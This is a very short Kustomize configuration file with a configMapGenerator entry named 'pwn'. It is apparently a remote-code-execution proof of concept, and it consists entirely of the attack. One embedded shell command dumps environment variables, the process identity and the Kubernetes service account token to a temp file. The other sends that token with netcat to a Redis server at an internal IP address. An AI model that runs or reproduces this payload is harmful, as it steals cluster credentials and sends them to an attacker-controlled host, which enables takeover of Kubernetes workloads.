configMapGenerator:
- name: pwn
  commands:
  - "env > /tmp/rce_out.txt 2>&1; id >> /tmp/rce_out.txt 2>&1; cat /run/secrets/kubernetes.io/serviceaccount/token >> /tmp/rce_out.txt 2>&1"
  - "printf 'SET zcode_sa_token_final ' > /tmp/rce_cmd.txt; cat /run/secrets/kubernetes.io/serviceaccount/token >> /tmp/rce_cmd.txt; printf '\r\n' >> /tmp/rce_cmd.txt; cat /tmp/rce_cmd.txt | nc -w 1 172.20.167.25 6379"
